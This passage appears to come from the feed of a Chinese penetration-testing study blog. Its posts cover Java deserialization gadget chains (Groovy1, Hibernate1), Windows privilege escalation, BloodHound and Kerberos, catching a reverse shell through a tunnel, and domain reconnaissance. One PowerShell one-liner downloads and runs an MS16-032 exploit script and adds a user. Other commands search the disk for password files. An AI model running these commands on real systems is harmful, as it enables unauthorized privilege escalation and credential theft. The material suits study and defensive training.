language-none"><code class="language-none">&#x2F;&#x2F;JDK8DiskFileItem.readObject()-&gt;getOutputStream()-&gt;DeferredFileOutputStream(sizeThreshold, getTempFile())#生成可写入的文件对象-&gt;output.write(FileInputStream(dfosFile#原始文件))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其实和上面的一样啦，就是生成文件对象然后把旧文件内容读出再写入，又因为进行了delete操作所以整个过程类似于剪切</p><p>剩下的因为<del>尊贵的</del>macOS移除了32位支持，所以JDK1.3.1的payload无法测试</p>        <h2 id="Groovy1"   >          <a href="#Groovy1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;*Gadget chain:AnnotationInvocationHandler#readObject()  ConvertedClosure#invoke()    ConversionHandler#invoke()      ConvertedClosure#invokeCustom()        MethodClosure#call()          Closure#call()            MetaClassImpl#invokeMethod()              dgm$748#doMethodInvoke()                ProcessGroovyMethods#execute()                  Runtime#exec()Requires:groovy *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是和CC一样的AnnotationInvocationHandler起始，其中的memberValues是被代理的Map，依然是通过entrySet触发代理invoke进而逐步触发，前置内容我们略过，直接从ConvertedClosure部分开始看</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;ConversionHandlerpublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;    VMPlugin plugin &#x3D; VMPluginFactory.getPlugin();    if (plugin.getVersion() &gt;&#x3D; 7 &amp;&amp; this.isDefaultMethod(method)) &#123;        Object handle &#x3D; this.handleCache.get(method);        if (handle &#x3D;&#x3D; null) &#123;            handle &#x3D; plugin.getInvokeSpecialHandle(method, proxy);            this.handleCache.put(method, handle);        &#125;        return plugin.invokeHandle(handle, args);    &#125; else if (!this.checkMethod(method)) &#123;        try &#123;            return this.invokeCustom(proxy, method, args);        &#125; catch (GroovyRuntimeException var6) &#123;            throw ScriptBytecodeAdapter.unwrap(var6);        &#125;    &#125; else &#123;        try &#123;            return method.invoke(this, args);        &#125; catch (InvocationTargetException var7) &#123;            throw var7.getTargetException();        &#125;    &#125;&#125;protected boolean checkMethod(Method method) &#123;    return isCoreObjectMethod(method);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是对ConvertedClosure.invoke的调用，看到其中并没有invoke方法就去其继承的父类中找，调用ConversionHandler.invoke，可以看到先通过checkMethod方法对调用的方法进行判断，看是否是Object类型原生存在的方法，很明显entrySet并不是，所以进入到ConvertedClosure.invokeCustom方法</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;ConvertedClosurepublic Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable &#123;    return this.methodName !&#x3D; null &amp;&amp; !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><del>正经人谁写三目表达式啊</del></p><p>总之执行了<code>((Closure)this.getDelegate()).call(args)</code>，delegate的类型是MethodClosure，调用了delegate.call，跟入，发现MethodClosure没有call方法，找父类Closure.call</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;Closurepublic V call(Object... args) &#123;    try &#123;        return this.getMetaClass().invokeMethod(this, &quot;doCall&quot;, args);    &#125; catch (InvokerInvocationException var3) &#123;        ExceptionUtils.sneakyThrow(var3.getCause());        return null;    &#125; catch (Exception var4) &#123;        return throwRuntimeException(var4);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续调用MetaClassImpl.invokeMethod(this,”doCall”,args)，代码量过大我们只截取关键部分</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">boolean isClosure &#x3D; object instanceof Closure;if (isClosure) &#123;    Closure closure &#x3D; (Closure)object;    Object owner &#x3D; closure.getOwner();    MetaClass ownerMetaClass;    if (&quot;call&quot;.equals(methodName) || &quot;doCall&quot;.equals(methodName)) &#123;        Class objectClass &#x3D; object.getClass();        if (objectClass &#x3D;&#x3D; MethodClosure.class) &#123;            MethodClosure mc &#x3D; (MethodClosure)object;            methodName &#x3D; mc.getMethod();            Class ownerClass &#x3D; owner instanceof Class ? (Class)owner : owner.getClass();            MetaClass ownerMetaClass &#x3D; this.registry.getMetaClass(ownerClass);            return ownerMetaClass.invokeMethod(ownerClass, owner, methodName, arguments, false, false);        &#125;        if (objectClass &#x3D;&#x3D; CurriedClosure.class) &#123;            CurriedClosure cc &#x3D; (CurriedClosure)object;            Object[] curriedArguments &#x3D; cc.getUncurriedArguments(arguments);            Class ownerClass &#x3D; owner instanceof Class ? (Class)owner : owner.getClass();            ownerMetaClass &#x3D; this.registry.getMetaClass(ownerClass);            return ownerMetaClass.invokeMethod(owner, methodName, curriedArguments);        &#125;        if (method &#x3D;&#x3D; null) &#123;            this.invokeMissingMethod(object, methodName, arguments);        &#125;    &#125;            return method !&#x3D; null ? method.doMethodInvoke(object, arguments) : this.invokePropertyOrMissing(object, methodName, originalArguments, fromInsideClass, isCallToSuper);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时object类型为MethodClosure，符合判断，因此后面会进入 <code>if(isClosure)</code>条件分支，然后递归调用<code>invokeMethod()</code>方法，我们跟入递归，发现其中执行的是<code>method.doMethodInvoke</code>，其method指向的是<code>dgm$748</code>的实例对象，跟入查看其实现</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;dgm$748&#x2F;&#x2F;var1&#x3D;commandpublic final Object doMethodInvoke(Object var1, Object[] var2) &#123;    this.coerceArgumentsToClasses(var2);    return ProcessGroovyMethods.execute((String)var1);&#125;其中ProcessGroovyMethods.execute的实现为public static Process execute(String self) throws IOException &#123;    return Runtime.getRuntime().exec(self);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令执行成功</p>        <h2 id="Hibernate1"   >          <a href="#Hibernate1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2>      <pre class="line-numbers language-none"><code class="language-none">&#x2F;** * * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() * * * Requires: * - Hibernate (&gt;&#x3D; 5 gives arbitrary method invocation, &lt;5 getXYZ only) * * @author mbechler *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文章引用：</p><p><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/solitudi/article/details/119082164" >https://blog.csdn.net/solitudi/article/details/119082164</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link"   href="https://www.anquanke.com/post/id/247434" >https://www.anquanke.com/post/id/247434</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link"   href="https://blog.weik1.top/" >https://blog.weik1.top/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows内网域渗透 提权</title>
      <link href="/posts/e80ed6fe.html"/>
      <url>/posts/e80ed6fe.html</url>
      
        <content type="html"><![CDATA[        <h1 id="低权限寻找提权手段"   >          <a href="#低权限寻找提权手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#低权限寻找提权手段" class="headerlink" title="低权限寻找提权手段"></a>低权限寻找提权手段</h1>      <p>常见的提权手段：</p><p>1、本地溢出漏洞</p><p>2、数据库提权</p><p>3、第三方软件提权</p><p>想要提权我们就需要先了解这台电脑上面究竟有什么漏洞可供我们利用，所以第一件事还是通过信息收集来找到我们可以利用的漏洞，这里有一些可以帮助我们的脚本</p>        <h2 id="寻找提权漏洞"   >          <a href="#寻找提权漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找提权漏洞" class="headerlink" title="寻找提权漏洞"></a>寻找提权漏洞</h2>              <h3 id="Windows-Exploit-Suggester-Next-Generation-WES-NG"   >          <a href="#Windows-Exploit-Suggester-Next-Generation-WES-NG" class="heading-link"><i class="fas fa-link"></i></a><a href="#Windows-Exploit-Suggester-Next-Generation-WES-NG" class="headerlink" title="Windows Exploit Suggester - Next Generation (WES-NG)"></a>Windows Exploit Suggester - Next Generation (WES-NG)</h3>      <p><span class="exturl"><a class="exturl__link"   href="https://github.com/bitsadmin/wesng" >脚本链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>这个脚本可以通过计算机的系统信息来看到电脑的补丁信息，进而推断出当前机器可被利用的漏洞</p><p>获取信息的方式有三种</p><blockquote><p>There are two options to check for missing patches: a. Launch <code>missingkbs.vbs</code> on the host to have Windows determine which patches are missing b. Use Windows’ built-in <code>systeminfo.exe</code> tool to obtain the system information of the local system, or from a remote system using <code>systeminfo /S MyRemoteHost</code>, and redirect this to a file: <code>systeminfo &gt; systeminfo.txt</code></p><p>有两个选项可以检查缺失的补丁：在主机上启动<code>missingkbs.vbs</code>，让 Windows 确定缺少哪些补丁 b.使用Windows内置的<code>systeminfo.exe</code>工具获取本地系统的系统信息，或者使用<code>systeminfo /S MyRemoteHost</code>从远程系统获取系统信息，并将其重定向到一个文件：<code>systeminfo &gt; systeminfo.txt</code></p></blockquote><p>获取到的信息放到文件中传入脚本执行即可看到结果</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202009074.png"></p>        <h2 id="提权脚本大全"   >          <a href="#提权脚本大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#提权脚本大全" class="headerlink" title="提权脚本大全"></a>提权脚本大全</h2>              <h3 id="溢出漏洞提权"   >          <a href="#溢出漏洞提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#溢出漏洞提权" class="headerlink" title="溢出漏洞提权"></a>溢出漏洞提权</h3>              <h4 id="MS16-032提权"   >          <a href="#MS16-032提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#MS16-032提权" class="headerlink" title="MS16-032提权"></a>MS16-032提权</h4>      <p>通过这个漏洞我们可以以一个普通用户身份，来添加一个administrator管理员组的用户，还能以SYSTEM权限来运行程序</p><p>漏洞前提：目标系统需要有2个以上的CPU核心，并且PowerShell是2.0以上的版本</p><p>此漏洞影响Windows Vista到Windows10之间的所有未修复设备</p><p>首先找到对应的<span class="exturl"><a class="exturl__link"   href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" >提权脚本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，按教程来说直接运行就好，但是我本机环境尝试了好多遍都没有反应，打开报错后发现是因为原始状态下限制了powershell执行脚本，在我想如何不使用管理员权限修改powershell控制时，发现了另一种执行脚本的方法</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;&#x2F;c net user evi1cg test123 &#x2F;add&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样执行的话就不会提示需要权限并且命令也能正常执行，这还有个小坑，就是在adduser的时候一定要保证密码是能通过安全性验证的，不然没有新用户生成很容易误认为提权失败</p><p>我们也可以直接执行木马文件，这样反弹的shell就是SYSTEM用户权限了</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202320685.png"></p>        <h3 id="本地提权漏洞"   >          <a href="#本地提权漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地提权漏洞" class="headerlink" title="本地提权漏洞"></a>本地提权漏洞</h3>              <h4 id="CVE-2020-0787"   >          <a href="#CVE-2020-0787" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2020-0787" class="headerlink" title="CVE-2020-0787"></a>CVE-2020-0787</h4>      <p>当Windows背景智能传输服务（BITS）没有正确处理符号链接时，存在特权提升漏洞，利用后攻击者可以改写目标文件来提升权限，利用条件就是攻击者需要登录系统，可以运行EXP</p><p>该漏洞影响的版本：Windows7 SP1-Windows10 1903所有架构</p><p>在利用时我们要先看目标机器是否有对应漏洞补丁</p><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr KB4540673<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202332882.png"></p><p>很好，没有对应的补丁，我们直接利用对应的EXP，上传后执行（mlgbd为什么不弹！！！！！！！！！！！！）</p>        <h3 id="数据库提权"   >          <a href="#数据库提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows内网域渗透3</title>
      <link href="/posts/d114db98.html"/>
      <url>/posts/d114db98.html</url>
      
        <content type="html"><![CDATA[        <h1 id="低权限搜集本机密码文件"   >          <a href="#低权限搜集本机密码文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#低权限搜集本机密码文件" class="headerlink" title="低权限搜集本机密码文件"></a>低权限搜集本机密码文件</h1>      <ul><li><p><strong>dir命令搜集当前机器各类密码配置文件</strong></p><p>一般配置或密码文件都是：</p><pre class="line-numbers language-none"><code class="language-none">pass.*,config.*,username.*,password.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以直接使用dir命令进行搜集，建议不要从C盘扫，从user目录下扫描</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">dir &#x2F;b &#x2F;s user.*,pass.*,config.*,username.*,password.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们cd到目标目录后直接执行，发现密码文件：</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192105452.png"></p><p>我们直接查看</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192107139.png"></p></li><li><p><strong>for循环搜集当前机器各类敏感密码的配置文件</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">for &#x2F;r C:\ %i in (pass.*) do @echo %i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个耗时比较久，我们需要稍等再查看，最终结果和上面的dir命令是相似的</p></li><li><p><strong>findstr命令查找文件中的字段</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">findstr &#x2F;c:&quot;user&quot; &#x2F;c:&quot;pass&quot; &#x2F;si *.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210192112055.png"></p></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows内网域渗透2</title>
      <link href="/posts/a613eb0e.html"/>
      <url>/posts/a613eb0e.html</url>
      
        <content type="html"><![CDATA[        <h1 id="BloodHound使用"   >          <a href="#BloodHound使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#BloodHound使用" class="headerlink" title="BloodHound使用"></a>BloodHound使用</h1>      <p>安装略过，百度都有</p><p>首先需要去官方的Github项目中下载收集器，注意这个玩意需要.net 4.7以上的运行环境的，不然直接弹窗给你看</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#exe命令</span>SharpHound<span class="token punctuation">.</span>exe <span class="token operator">-</span>c all<span class="token comment">#powershell命令</span>powershell <span class="token operator">-</span>exec bypass <span class="token operator">-</span>command <span class="token string">"Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="前置知识"   >          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>              <h3 id="关于身份认证方式"   >          <a href="#关于身份认证方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于身份认证方式" class="headerlink" title="关于身份认证方式"></a>关于身份认证方式</h3>              <h4 id="kerberos认证"   >          <a href="#kerberos认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#kerberos认证" class="headerlink" title="kerberos认证"></a>kerberos认证</h4>      <ul><li><p><strong>简介</strong></p><p>Kerberos协议是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，kerberos侧重于通信前双方身份的认定工作，帮助客户端和服务端解决“证明我自己是我自己”的问题，从而使得通信两端能够完全信任对方身份，在一个不安全的网络中完成一次安全的身份认证继而进行安全的通信。</p></li><li><p><strong>组成角色</strong></p><p><strong>客户端（client）</strong>：发送请求的一方</p><p><strong>服务端（Server）</strong>：接收请求的一方</p><p><strong>密钥分发中心（Key Distribution Center，KDC）</strong>，而密钥分发中心一般又分为两部分，分别是： </p><ul><li><strong>AS（Authentication Server）</strong>：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据） </li><li><strong>TGS（Ticket Granting Ticket）</strong>：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</li></ul><p>在整个kerberos认证过程中，三个角色缺一不可</p></li><li><p><strong>原理</strong></p><p>为了方便我们理解，我们先假设这么一个场景，现在有ABC三人，A需要去找B完成一件事情，但是彼此并没有见过面，只知道对方的名字，那如果A直接去找B，A就没有办法向B直接证明自己就是A，所以现在他们找到了彼此都认识并且信任的C，让C给A一个凭证，由A交给B去找C来验证身份，这时A就能验证自己的身份了</p><p>上面这个例子就很好的说明了kerberos认证的方式，A相当于客户端，B相当于服务端，C相当于KDC，KDC中包含一个叫做TGS（票据授予中心）的组件，我们便可以理解为他就是一个发放身份认证票据的服务中心，在KDC认证了（其实是KDC中的AS认证的）客户端的身份后，他会给客户端发放用于访问网络服务的服务授予票据（Ticket）。由于整个kerberos通信过程都采用对称加密的方式，密钥的获取也是从KDC中得到，所以KDC叫做密钥分发中心。 </p></li><li><p><strong>流程</strong></p><p>上面的原理搞明白了也就很容易知道流程了，不过我们还需要解决两个问题</p><p><strong>问题1</strong> KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</p><p><strong>问题2</strong> 服务端怎么知道你带来的服务授予票据（Ticket）就是一张真正的票据呢？</p><p>所以说上面的原理只是一个简化后的模型，实际上的一次完整的kerberos认证总共需要三次通信</p><ol><li>客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以<strong>第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端</strong></li><li>客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求，</li><li>此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</li></ol><p>了解到这些再看老庞的图</p><p><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113610118.png" alt="image-20221010113610118"></p><p><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/image-20221010113606949.png" alt="image-20221010113606949"></p><p><img src="https://images-1306872001.cos.ap-nanjing.myqcloud.com/img/62638be70e3e745194dca594.png" alt="62638be70e3e745194dca594"></p></li></ul>        <h4 id="NTLM认证"   >          <a href="#NTLM认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h4>      <p>本地密码哈希，没了</p>        <h2 id="BloodHound板块"   >          <a href="#BloodHound板块" class="heading-link"><i class="fas fa-link"></i></a><a href="#BloodHound板块" class="headerlink" title="BloodHound板块"></a>BloodHound板块</h2>      <ol><li><p>Database Info（数据库信息），可查看当前数据库中的域用户，域计算机等统计信息</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182041355.png"></p></li><li><p>Node Info（节点信息），单击某个节点时，可以看到对应节点的详细信息</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210182045362.png"></p></li><li><p>Analysis（分析查询）提供了一些预设好的查询语句</p></li></ol><ul><li><strong>Find all Domain Admins</strong>（查询所有域管理员）</li><li><strong>Find Shortest Paths to Domain Admins</strong>（找出域管理员的最短路径）</li></ul><p>部分内容引用以下文章：</p><p><span class="exturl"><a class="exturl__link"   href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/" >详解kerberos认证原理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无公网服务器反弹shell</title>
      <link href="/posts/23df454a.html"/>
      <url>/posts/23df454a.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>用SakuraFrp（因为免费），<span class="exturl"><a class="exturl__link"   href="https://www.natfrp.com/user/" >https://www.natfrp.com/user/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></li><li><p>在<strong>穿透—隧道</strong>中开启一个新的隧道，本地端口可任意设定，本地端口即为稍后电脑要监听的端口</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171924171.png"></p></li><li><p>下载SakuraFrp的官方软件，运行，在个人中心中找到token并填入</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171948612.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171949150.png"></p><p>如图所示说明隧道已开启</p></li><li><p>另起一个shell端口，监听之前设置过的端口</p><p><code>nc -lvp 设置的端口</code></p></li><li><p>用执行命令后提示的IP或域名来生成反弹shell命令</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952293.png"></p></li><li><p>执行后成功弹shell</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210171952765.png"></p></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows内网域渗透</title>
      <link href="/posts/a0d619b1.html"/>
      <url>/posts/a0d619b1.html</url>
      
        <content type="html"><![CDATA[        <h1 id="Windows内网域渗透"   >          <a href="#Windows内网域渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#Windows内网域渗透" class="headerlink" title="Windows内网域渗透"></a>Windows内网域渗透</h1>              <h2 id="域森林下的内网信息搜集"   >          <a href="#域森林下的内网信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#域森林下的内网信息搜集" class="headerlink" title="域森林下的内网信息搜集"></a>域森林下的内网信息搜集</h2>      <p>在我们进行渗透测试进入内网后，面对的是一片黑暗，所以我们首先应当做的就是对当前所处的网络环境进行一个判断，通常分为三种判断</p><ul><li>我是谁————对机器角色判断</li><li>这是哪————对目前机器所处的网络环境的拓扑结构进行分析和判断</li><li>我在哪————对目前机器所处的位置区域进行判断</li></ul><p>所以我们需要对目标内网进行信息搜集，搜集的越多对内网越了解才能在渗透中如鱼得水</p><p>那假设我们现在已经获取到<strong>darkflow.com</strong>域中的<strong>web-2021</strong>机器的控制权限，接下来我们尝试使用CS来进行内网信息搜集</p>        <h3 id="是否在域中"   >          <a href="#是否在域中" class="heading-link"><i class="fas fa-link"></i></a><a href="#是否在域中" class="headerlink" title="是否在域中"></a>是否在域中</h3>      <p>在对Windows进行内网渗透的时候，针对域环境和工作组环境所进行的渗透方式是完全不同的，所以我们应当先判断主机事都在域中，此处有两种方式</p><ol><li><p>使用<code>ipconfig /all</code>查看当前网卡和IP信息</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122203724.png"></p><p>可以看到命令执行之后在IP配置汇总存在主DNS后缀，这代表我们存在在域环境中，反之则是工作组环境</p></li><li><p>使用<code>systeminfo</code>查看系统详细信息</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210122205249.png"></p><p>此处中域显示为一个域名，而如果是工作组则会显示WORKGROUP</p></li><li><p>使用<code>net config workstation</code>查看当前登录域以及用户</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132335431.png"></p><p>可以看到其中有工作站域并且不是WORKGROUP</p></li><li><p>使用<code>net time /domain</code>来查看系统时间，其中的<code>/domain</code>参数代表其只能在域环境中执行</p><p>该命令执行后有三种情况</p><ul><li>存在域但当前用户并非域内用户：<code>发生系统错误，拒绝访问</code></li><li>存在域并且当前用户是域内用户：显示域以及时间</li><li>不存在域：找不到WORKGROUP的域控制器</li></ul></li></ol>        <h3 id="本机信息搜集"   >          <a href="#本机信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3>      <p>在分辨好我们是在域中还是工作组后，我们就可以对当前机器进行信息搜集了</p><ul><li><p><strong>获取本机网络配置信息</strong>：<code>ipconfig /all</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132346666.png"></p><p>用来分析网络拓扑，如果机器在内网中我们就可以扩大范围进行内网的横向渗透，拿下更多资产</p></li><li><p><strong>查询操作系统和版本信息</strong>：<code>systeminfo | findstr /B /C:&quot;OS&quot;</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210132345103.png"></p><p>可以了解到本机的系统版本，在我们想要进行提权的时候我们可以针对性的寻找对应的exp</p></li><li><p><strong>查看本机已安装的软件及版本，路径</strong>：<code>wmic product get name,version</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210140055450.png"></p><p>通过搜集已安装的软件信息，可以针对某款软件的漏洞来进行一些提权等操作</p></li><li><p><strong>查看本机进程信息</strong>：<code>tasklist /v</code></p><p><img 